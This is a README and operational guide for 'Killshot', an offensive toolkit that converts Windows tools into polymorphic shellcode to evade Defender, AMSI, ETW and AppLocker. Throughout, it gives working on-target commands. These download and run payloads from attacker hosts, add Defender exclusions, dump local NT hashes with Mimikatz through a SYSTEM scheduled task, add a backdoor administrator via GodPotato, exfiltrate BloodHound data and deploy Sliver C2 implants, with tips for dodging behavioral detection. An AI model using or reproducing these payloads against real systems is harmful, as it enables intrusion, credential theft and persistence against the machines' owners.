# Killshot

Polymorphic AV/AMSI bypass toolkit. Converts any Windows PE or .NET tool into
in-memory shellcode that bypasses Defender on fully-patched Windows 11 24H2.

## How It Works

```
PE/.NET binary ──► Donut (shellcode) ──► base64 (.enc) ──► runner.exe loads in-memory
                                                              │
                                              ETW patched ────┘
                                              RW→RX memory
                                              Randomized injection method
                                              Polymorphic per build

Sliver beacon ──► shellcode (.bin) ──► MSI custom action DLL ──► msiexec /qn
                                          │                         │
                                          │  (>1MB: staged loader)  │
                                          │  Downloads XOR'd        │
                                          │  shellcode at runtime   │
                                          └─────────────────────────┘
```

Every invocation produces unique binaries — randomized variable names, API string
splits, junk functions, and multiple injection methods (CreateThread, EnumWindows
callback, CreateFiber). Runner.exe patches ETW before execution to blind telemetry.

## Quick Start

```bash
# 1. Install (downloads tools + sets up compilers)
./install.sh

# 2. Generate everything (outputs to ./killshot/)
killshot generate --all -l 10.10.14.5

# 3. Serve files
killshot serve

# 4a. On target — Runner (any .enc payload)
certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
%TEMP%\r.exe -remote http://10.10.14.5:8000/implant.enc

# 4b. On target — MSI (AppLocker bypass, no runner needed)
certutil -urlcache -split -f http://10.10.14.5:8000/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn
```

## Toolkit

| Script | Purpose |
|---|---|
| `install.sh` | Downloads tools, installs Go 1.25.x/Donut/garble, verifies everything |
| `killshot.sh` | Main generator — component-based payload generation |
| `killshot.py` | Converts individual tools to Donut shellcode |
| `gen_runner.py` | Generates polymorphic Go shellcode loader |
| `gen_stager.py` | Generates PowerShell stager with AMSI bypass |
| `gen_potato.py` | Converts potato exploits to shellcode with baked-in commands |
| `gen_tool_stager.py` | Generates PowerShell in-memory loaders (fallback) |
| `gen_msi.py` | MSI/DLL AppLocker bypass — embedded or staged (WinHTTP download) |
| `gen_applocker.py` | MSBuild XML and InstallUtil C# AppLocker bypasses |

## Usage

All operations go through a single `killshot` command. Output goes to `./killshot/` under the current working directory.

```bash
# Info & verification
killshot help                                           # Show help
killshot list                                           # List available tools
killshot check                                          # Verify installation
killshot serve                                          # HTTP server for ./killshot/

# Generate specific components (mix and match)
killshot generate --runner                              # Polymorphic runner.exe only
killshot generate --implant -l 10.10.14.5               # C2 implant shellcode (Sliver)
killshot generate --implant -l 10.10.14.5 -f msf        # C2 implant shellcode (MSF)
killshot generate --implant -l 10.10.14.5 --proto http  # Sliver HTTP beacon
killshot generate --stager                              # PowerShell stager with AMSI bypass
killshot generate --tool Rubeus --params 'kerberoast'   # Single tool to shellcode
killshot generate --tool Certify                        # Single tool (default params)
killshot generate --tools                               # All tools to shellcode
killshot generate --potato GodPotato -c 'cmd /c whoami' # Single potato exploit
killshot generate --potatoes -c 'cmd /c whoami'         # All potato exploits
killshot generate --loaders                             # PowerShell tool loaders

# AppLocker bypass payloads (requires implant shellcode)
killshot generate --msi                                 # MSI for msiexec (auto-detects staged)
killshot generate --msbuild                             # MSBuild XML inline C# task
killshot generate --installutil                         # InstallUtil C# source

# Generate everything at once
killshot generate --all -l 10.10.14.5
```

### Generate Options

| Flag | Default | Description |
|---|---|---|
| `-l, --lhost` | `10.99.0.16` | Callback/listener IP |
| `-p, --lport` | `4444` | C2 listener port |
| `-h, --http` | `8000` | HTTP file server port |
| `-f, --framework` | `sliver` | `sliver` or `msf` |
| `-t, --type` | `beacon` | `beacon` or `session` (Sliver) |
| `--proto` | `mtls` | `mtls`, `http`, or `https` (Sliver) |
| `-c, --cmd` | auto | Custom command for potatoes |
| `--params` | defaults | Custom params for `--tool` |
| `-o, --output` | auto | Output path for `--tool`/`--potato` |

### MSI Generation (standalone)

`gen_msi.py` can be used directly for fine-grained control:

```bash
# Embedded mode — shellcode baked into DLL (small payloads <1MB)
python3 gen_msi.py -i shellcode.bin -o update.msi

# Staged mode — DLL downloads XOR'd shellcode from URL at runtime (large payloads)
python3 gen_msi.py --url http://10.10.14.5:8000/beacon.bin -i implant.bin -o update.msi
# This creates update.msi (20KB) + beacon.bin (XOR'd shellcode to serve via HTTP)

# DLL only (for rundll32 or trusted path injection)
python3 gen_msi.py -i shellcode.bin -o loader.dll --dll-only

# Custom options
python3 gen_msi.py -i shellcode.bin -o update.msi --name "Windows Update" --xor-key 42
```

When using `killshot generate --msi`, staged mode is selected automatically if the shellcode exceeds 1MB (typical for Sliver beacons ~19MB).

### install.sh

```bash
./install.sh              # Full install
./install.sh --update     # Update all tools to latest versions
./install.sh --tools-only # Only download tool binaries
./install.sh --check      # Verify installation
```

## Included Tools

### Credential Access
| Tool | Description | Default Params |
|---|---|---|
| Rubeus | Kerberos abuse | `triage` |
| Mimikatz | Credential extraction | `privilege::debug sekurlsa::logonpasswords exit` |
| SharpDPAPI | DPAPI credential extraction | `triage` |
| SharpChrome | Chrome saved credentials | `logins` |

### Enumeration
| Tool | Description | Default Params |
|---|---|---|
| SharpHound | BloodHound AD collector | `-c All --memcache` |
| Certify | AD CS certificate abuse | `find /vulnerable` |
| Seatbelt | Host security survey | `-group=all -full` |
| winPEAS | Privilege escalation scanner | `quiet` |

### Privilege Escalation
| Tool | Description | Default Params |
|---|---|---|
| SharpUp | Privesc checks (GhostPack) | `audit` |
| GodPotato | SeImpersonate → SYSTEM | Baked stager command |
| PrintSpoofer | SeImpersonate → SYSTEM | Baked stager command |
| BadPotato | SeImpersonate → SYSTEM | Baked stager command |
| EfsPotato | SeImpersonate → SYSTEM | Baked stager command |
| KrbRelayUp | Kerberos relay privesc | `relay` |

### Lateral Movement & Tunneling
| Tool | Description | Default Params |
|---|---|---|
| Ligolo-ng agent | Tunneling agent | `-connect LHOST:11601 -ignore-cert` |
| Chisel | Tunnel client | `client LHOST:8443 R:socks` |

### Active Directory
| Tool | Description | Default Params |
|---|---|---|
| Whisker | Shadow Credentials attack | `list` |

## On-Target Usage

### Runner (polymorphic loader for any .enc payload)
```powershell
# Download runner once
certutil -urlcache -split -f http://LHOST:PORT/runner.exe %TEMP%\r.exe

# Run any tool
%TEMP%\r.exe -remote http://LHOST:PORT/implant.enc
%TEMP%\r.exe -remote http://LHOST:PORT/rubeus.enc
%TEMP%\r.exe -remote http://LHOST:PORT/mimikatz.enc
%TEMP%\r.exe -remote http://LHOST:PORT/seatbelt.enc
%TEMP%\r.exe -remote http://LHOST:PORT/godpotato.enc

# Or local file
%TEMP%\r.exe -local C:\path\to\payload.enc

# Or use the stager (AMSI bypass + auto-download runner + load implant)
IEX(IWR -UseBasicParsing http://LHOST:PORT/stager.ps1)
```

### MSI (AppLocker bypass — no runner needed)
```powershell
# Embedded MSI (small shellcode baked in)
certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn

# Staged MSI (large shellcode like Sliver beacons)
# 1. Serve beacon.bin + update.msi via HTTP
# 2. On target:
certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn
# MSI automatically downloads shellcode from the URL baked into the DLL
```

### Other AppLocker Bypasses
```powershell
# MSBuild — download XML, execute via trusted .NET binary
certutil -urlcache -split -f http://LHOST:PORT/build.xml %TEMP%\b.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe %TEMP%\b.xml

# InstallUtil — download CS, compile on target, execute via trusted binary
certutil -urlcache -split -f http://LHOST:PORT/service.cs %TEMP%\s.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:%TEMP%\s.dll %TEMP%\s.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\s.dll

# DLL via rundll32
certutil -urlcache -split -f http://LHOST:PORT/update.dll %TEMP%\u.dll
rundll32.exe %TEMP%\u.dll,DllRegisterServer 0
```

## Evasion Techniques

- **Polymorphic runner** — unique binary each build (random identifiers, junk functions, API string splits)
- **ETW patching** — patches `EtwEventWrite` to `ret` before shellcode execution
- **Multiple injection methods** — randomly selects CreateThread, EnumWindows callback, or CreateFiber
- **RW→RX memory** — allocates as read-write, copies shellcode, then flips to read-execute
- **Sandbox detection** — timing check catches accelerated sleep in sandboxes
- **Donut shellcode** — position-independent shellcode from any PE/.NET, runs entirely in-memory
- **AMSI bypass** — reflection-based patching with byte-array obfuscated class names
- **Garble compilation** — Go binary obfuscation (requires Go 1.25.x)
- **No disk artifacts** — tools never touch disk, loaded directly into memory via runner
- **AppLocker bypass** — MSBuild XML, InstallUtil, MSI custom action, rundll32 via trusted paths
- **XOR-encrypted DLL** — loader DLL with randomized exports and encrypted shellcode
- **Staged MSI loader** — 20KB MSI downloads XOR'd shellcode via WinHTTP at runtime (avoids embedding 19MB beacon)
- **MSI trusted binary** — executed by msiexec.exe (Microsoft-signed, AppLocker-whitelisted)

## Directory Structure

```
avbypass/
├── install.sh            # Installer (caps Go at 1.25.x for garble)
├── killshot.sh           # Main payload generator
├── killshot.py           # Tool-to-shellcode converter
├── gen_runner.py         # Polymorphic runner generator
├── gen_stager.py         # PowerShell stager generator
├── gen_potato.py         # Potato privesc generator
├── gen_msi.py            # MSI/DLL AppLocker bypass (embedded + staged)
├── gen_applocker.py      # MSBuild/InstallUtil AppLocker bypass
├── gen_tool_stager.py    # Tool loader generator
├── go.mod / go.sum       # Go module (cached for offline)
├── tools/
│   ├── potatoes/         # Potato exploit binaries
│   └── windows/          # Offensive tool binaries
└── go/                   # Local Go 1.25.x toolchain (after install)
```

Generated output (`./killshot/` under CWD):
```
killshot/
├── runner.exe            # Polymorphic loader (unique per build)
├── implant.enc           # Base64 shellcode for runner
├── update.msi            # MSI AppLocker bypass (~20KB)
├── beacon.bin            # XOR'd shellcode for staged MSI (if >1MB)
├── stager.ps1            # PowerShell stager
├── build.xml             # MSBuild AppLocker bypass
├── service.cs            # InstallUtil AppLocker bypass
├── *.enc                 # Tool shellcode files (rubeus.enc, etc.)
└── *.enc                 # Potato shellcode files
```

## Requirements

| Component | Required | Purpose |
|---|---|---|
| Python 3 | Yes | Runs all generators |
| Go 1.25.x | Yes | Cross-compiles runner.exe (1.26+ breaks garble) |
| donut-shellcode | Yes | PE-to-shellcode conversion |
| garble | Yes | Go binary obfuscation |
| mingw-w64 | Yes | DLL cross-compilation (MSI/AppLocker) |
| msibuild (msitools) | Optional | MSI packaging (falls back to DLL-only) |
| Sliver or MSF | Yes* | C2 implant generation |

*Only needed for implant generation. Tools work independently via `killshot.py`.

## Tested On

- Windows 11 24H2 (Build 26200) — Defender ON + cloud protection level 2
  - MSI bypass: Sliver beacon callback confirmed via msiexec.exe
  - Runner bypass: Sliver beacon callback confirmed via runner.exe
  - All injection methods (CreateThread, EnumWindows, CreateFiber) functional
- Windows Server 2022 — Defender with default settings

---

## Hardened Windows 11 Operational Guide

Validated against: Windows 11 24H2, Defender real-time ON, LSASS RunAsPPL=2, UMCI off.

### Critical Architecture Notes

**RunAsPPL=2 (Win11 default):** Blocks `sekurlsa::logonpasswords` even as SYSTEM. Use `lsadump::sam` via SYSTEM scheduled task instead. Check: `(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').RunAsPPL`

**WinPEAS requires create_thread runner:** fiber/enum_windows fall back to 1MB CreateThread stack → `STATUS_STACK_OVERFLOW` crash. Always compile runner with `--injection create_thread` when using WinPEAS or mimikatz.

**ExclusionPath vs ExclusionProcess — BOTH required:**
- `ExclusionPath`: prevents file-scan quarantine of binaries written to that directory
- `ExclusionProcess`: disables AMSI scanning for scripts run under that process
- ExclusionProcess alone does NOT protect the `.exe` file from being quarantined on disk

**Dropper behavioral detection:** XOR-decode + `WriteAllBytes` to `.exe` in a single WinRM call triggers behavioral detection. Split into separate WinRM calls.

**GodPotato output:** Spawns processes asynchronously. `cmd /c ... > file` redirect loses donut .NET console output. Only runner banner (~36 bytes) captured via Process.StandardOutput. Use scheduled task pattern for tool output.

**UTF-16 LE:** Mimikatz output via scheduled task redirect is UTF-16 LE. Decode with `[System.Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes(...))`.

---

### Step 0: AMSI/Defender Bypass

Run as **two separate WinRM/PS calls** — combined behavioral detection fires:

```powershell
# Call 1: ExclusionPath (must run BEFORE writing any binary to TEMP)
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue

# Call 2: ExclusionProcess (disables AMSI for runner's child scripts)
Add-MpPreference -ExclusionProcess 'runner.exe' -ErrorAction SilentlyContinue
```

---

### Step 1: Transfer Runner

**From admin WinRM session (XOR-encoded .dat transfer):**

```powershell
# Separate calls — do NOT combine decode+write in one command
$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat')
$b=New-Object byte[] $d.Length
for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
[IO.File]::WriteAllBytes("$env:TEMP\runner.exe",[byte[]]$b)
```

**CMD-only (no PS):**
```cmd
certutil -urlcache -split -f http://10.99.0.16:8888/runner_ct32.dat %TEMP%\r.dat
powershell -c "$d=[IO.File]::ReadAllBytes('$env:TEMP\r.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor0x5A};[IO.File]::WriteAllBytes('$env:TEMP\runner.exe',$b)"
```

---

### Step 2: Run Any Tool (Universal Pattern)

All tools use this PS Process pattern — the only way to capture output reliably:

```powershell
# Download .enc shellcode
(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/TOOL.enc',"$env:TEMP\t.enc")

# Execute + capture output
$si=New-Object System.Diagnostics.ProcessStartInfo
$si.FileName="$env:TEMP\runner.exe"
$si.Arguments="-local $env:TEMP\t.enc"
$si.RedirectStandardOutput=$true
$si.RedirectStandardError=$true
$si.UseShellExecute=$false
$si.WindowStyle='Hidden'
$p=[System.Diagnostics.Process]::Start($si)
$out=$p.StandardOutput.ReadToEnd()
$p.WaitForExit()
$out
```

---

### WinPEAS

**Status: Confirmed 5.4MB output, no crash.**

```bash
# Generate (attacker)
python3 killshot.py --tool winPEAS -o /workspace/killshot/winpeas.enc
# Default params = "" (no-args mode). "quiet" causes crash at output end.
# Runner MUST be compiled with --injection create_thread
```

```powershell
# Target — use universal pattern, pipe output to file
(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/winpeas.enc',"$env:TEMP\wp.enc")
$si=New-Object System.Diagnostics.ProcessStartInfo
$si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $env:TEMP\wp.enc"
$si.RedirectStandardOutput=$true;$si.UseShellExecute=$false;$si.WindowStyle='Hidden'
$p=[System.Diagnostics.Process]::Start($si)
$out=$p.StandardOutput.ReadToEnd();$p.WaitForExit()
$out | Out-File "$env:TEMP\winpeas_out.txt"
```

---

### Seatbelt

**Status: Confirmed 502KB output, ExitCode=0.**

```bash
# Generate
python3 killshot.py --tool Seatbelt --params "-group=all --memcache" -o /workspace/killshot/seatbelt.enc
```

Useful param combos:
| Params | Use |
|--------|-----|
| `-group=all` | Full survey |
| `User` | User tokens, environment |
| `PowerShell` | PS logging/version |
| `CredGuard` | Credential Guard status |
| `Certificates` | Cert store |
| `Services` | Service ACLs |
| `ProcessCreationEvents 100` | Recent process births |

Run via universal pattern with `seatbelt.enc`.

---

### Rubeus

```bash
python3 killshot.py --tool Rubeus --params "triage" -o /workspace/killshot/rubeus_triage.enc
python3 killshot.py --tool Rubeus --params "kerberoast /outfile:C:\Windows\Temp\hashes.txt" -o /workspace/killshot/rubeus_krbst.enc
python3 killshot.py --tool Rubeus --params "asreproast /format:hashcat" -o /workspace/killshot/rubeus_asrep.enc
python3 killshot.py --tool Rubeus --params "dump /luid:0x0 /service:krbtgt" -o /workspace/killshot/rubeus_dump.enc
python3 killshot.py --tool Rubeus --params "asktgt /user:USER /rc4:HASH /ptt" -o /workspace/killshot/rubeus_pth.enc
```

Run via universal pattern.

---

### Mimikatz

#### Mode A: sekurlsa (requires RunAsPPL=0 or disabled)

Check PPL: `(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').RunAsPPL`

Disable PPL (admin + reboot):
```powershell
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -Value 0
Restart-Computer -Force
```

```bash
python3 killshot.py --tool mimikatz --params "privilege::debug sekurlsa::logonpasswords exit" \
  -o /workspace/killshot/mimi_logon.enc
```

#### Mode B: lsadump::sam via SYSTEM scheduled task (CONFIRMED WORKING — no PPL bypass needed)

`lsadump::sam` reads SAM/SYSTEM registry hives. Requires SYSTEM, not LSASS access.

```bash
python3 killshot.py --tool mimikatz --params "lsadump::sam exit" -o /workspace/killshot/mimi_sam.enc
```

```powershell
# (Runner already at $env:TEMP\runner.exe, mimi_sam.enc downloaded as $env:TEMP\ms.enc)
$cmd="$env:TEMP\runner.exe -local $env:TEMP\ms.enc > C:\Windows\Temp\mimi_out.txt 2>&1"
$action=New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $cmd"
$settings=New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
Register-ScheduledTask -TaskName "SysTask" -Action $action -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
Start-ScheduledTask -TaskName "SysTask"
Start-Sleep -Seconds 15

# Read back (UTF-16 LE decode)
$bytes=[IO.File]::ReadAllBytes('C:\Windows\Temp\mimi_out.txt')
[System.Text.Encoding]::Unicode.GetString($bytes)

# Cleanup
Unregister-ScheduledTask -TaskName "SysTask" -Confirm:$false
Remove-Item 'C:\Windows\Temp\mimi_out.txt' -Force
```

Expected output includes NT hashes for all local accounts.

---

### GodPotato (SeImpersonate → SYSTEM)

**Status: SYSTEM confirmed (USERNAME=DESKTOP-ECOOF0G$ with trailing $).**

```bash
# Arbitrary command
python3 gen_potato.py --tool GodPotato --cmd "cmd /c whoami > C:\Windows\Temp\who.txt" \
  -o /workspace/killshot/gp_who.enc

# Add local admin user
python3 gen_potato.py --tool GodPotato --cmd "cmd /c net user backdoor Pass123! /add && net localgroup administrators backdoor /add" \
  -o /workspace/killshot/gp_adduser.enc

# Run tool as SYSTEM (use scheduled task for output — see below)
python3 gen_potato.py --tool GodPotato \
  --cmd "C:\Windows\Temp\runner.exe -local C:\Windows\Temp\ms.enc > C:\Windows\Temp\out.txt 2>&1" \
  -o /workspace/killshot/gp_mimi.enc
```

**Capture output (scheduled task pattern):**

GodPotato spawns processes asynchronously — cmd redirect to file works but PS Process.StandardOutput only shows runner banner. For tool output, use scheduled task (see Mimikatz Mode B) instead of GodPotato.

```powershell
# Simple cmd output to file works fine:
(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/gp_who.enc',"$env:TEMP\gp.enc")
# ... universal pattern ...
Get-Content C:\Windows\Temp\who.txt  # read result
```

---

### PrintSpoofer

Requires Print Spooler service running:
```powershell
Start-Service Spooler
Set-Service Spooler -StartupType Automatic
```

```bash
python3 gen_potato.py --tool PrintSpoofer --cmd "cmd /c whoami > C:\Windows\Temp\who.txt" \
  -o /workspace/killshot/ps_who.enc
```

---

### Sliver Implant

```bash
# Generate shellcode implant via Sliver
# (sliver-server must be running in exegol)
sliver > generate --mtls 10.99.0.16:4444 --os windows --arch amd64 --format shellcode --save /workspace/killshot/sliver.bin

# Base64 encode for runner
python3 -c "
import base64
with open('/workspace/killshot/sliver.bin','rb') as f: d=f.read()
with open('/workspace/killshot/sliver.enc','wb') as f: f.write(base64.b64encode(d))
print(f'[+] {len(d)} bytes → sliver.enc')
"

# Start listener
sliver > mtls --lport 4444
```

Run via universal pattern with `sliver.enc`. No output — session appears in sliver console.

Or use `killshot generate --implant -l 10.99.0.16` for the full automated pipeline.

---

### SharpHound

```bash
python3 killshot.py --tool SharpHound --params "-c All --memcache" -o /workspace/killshot/sharphound.enc
```

```powershell
# SharpHound writes zip files to WorkingDirectory
$si=New-Object System.Diagnostics.ProcessStartInfo
$si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $env:TEMP\sh.enc"
$si.WorkingDirectory="C:\Windows\Temp"  # zip files land here
$si.RedirectStandardOutput=$true;$si.UseShellExecute=$false;$si.WindowStyle='Hidden'
$p=[System.Diagnostics.Process]::Start($si);$p.WaitForExit()

# Exfil zip as base64
$zip=(Get-ChildItem C:\Windows\Temp\*BloodHound*.zip | Select -Last 1).FullName
[Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
# Decode on attacker: echo BASE64 | base64 -d > bloodhound.zip
```

---

### Certify

```bash
python3 killshot.py --tool Certify --params "find /vulnerable" -o /workspace/killshot/certify.enc
python3 killshot.py --tool Certify --params "request /ca:CA\CA-NAME /template:VulnTemplate /altname:administrator" \
  -o /workspace/killshot/certify_req.enc
```

---

### Other Tools (same universal pattern)

| Tool | Generate command |
|------|-----------------|
| Whisker | `--tool Whisker --params "list"` |
| SharpDPAPI | `--tool SharpDPAPI --params "triage"` |
| SharpUp | `--tool SharpUp --params "audit"` |
| SharpChrome | `--tool SharpChrome --params "logins"` |
| LaZagne | `--tool lazagne --params "all"` |
| Ligolo agent | `--tool ligolo-agent --params "-connect 10.99.0.16:11601 -ignore-cert"` |
| Chisel | `--tool chisel --params "client 10.99.0.16:8443 R:socks"` |

---

### Full Pipeline Quick Reference

**Attacker:**
```bash
cd /home/p3ta/.exegol/my-resources/avbypass

# Compile runner (always create_thread)
python3 gen_runner.py --injection create_thread -o /workspace/killshot/runner_ct32.dat

# Generate all tools
python3 killshot.py --all --lhost 10.99.0.16 -w /workspace/killshot/

# Serve
cd /workspace/killshot && python3 -m http.server 8888

# Generate stager for specific tool
python3 gen_stager.py \
  --runner-url http://10.99.0.16:8888/runner_ct32.dat \
  --implant-url http://10.99.0.16:8888/seatbelt.enc \
  -o /workspace/killshot/stager.ps1
```

**Target (admin WinRM/PS):**
```powershell
# 1. Bypass (two separate calls)
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess 'runner.exe' -ErrorAction SilentlyContinue

# 2. Transfer runner
$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat')
$b=New-Object byte[] $d.Length
for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
[IO.File]::WriteAllBytes("$env:TEMP\runner.exe",[byte[]]$b)

# 3. Load any tool
(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/TOOL.enc',"$env:TEMP\t.enc")
$si=New-Object System.Diagnostics.ProcessStartInfo
$si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $env:TEMP\t.enc"
$si.RedirectStandardOutput=$true;$si.UseShellExecute=$false;$si.WindowStyle='Hidden'
$p=[System.Diagnostics.Process]::Start($si);$out=$p.StandardOutput.ReadToEnd();$p.WaitForExit()
$out
```

---

### Known Limitations

| Issue | Cause | Workaround |
|-------|-------|-----------|
| `sekurlsa::logonpasswords` fails | RunAsPPL=2 (Win11 default) | Use `lsadump::sam` via SYSTEM scheduled task, or disable PPL + reboot |
| GodPotato cmd output lost | Async process, no stdout redirect from donut | Use scheduled task for output capture; cmd→file works for simple commands |
| WinPEAS crash on fiber/enum_windows runner | 1MB stack → STATUS_STACK_OVERFLOW | Always use `create_thread` runner |
| Runner quarantined despite ExclusionProcess | ExclusionProcess doesn't protect files on disk | Add ExclusionPath BEFORE writing runner to TEMP |
| Behavioral detection on XOR-decode + WriteAllBytes | Combined decode+write triggers behavioral alert | Split into two separate WinRM/PS calls |
| mimikatz output garbled | UTF-16 LE from scheduled task redirect | `[System.Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes(...))` |
| PrintSpoofer no SYSTEM | Print Spooler service disabled | `Start-Service Spooler` first |
| GodPotato Win32Error:5 on complex commands | Long cmd strings fail CreateProcess | Use `C:\Windows\Temp` (not user TEMP); keep cmd string short |
| Donut not found | donut only in Empire/angr venv | Use `/opt/tools/Empire/venv/bin/python3` or `/opt/tools/angr/venv/bin/python3` |
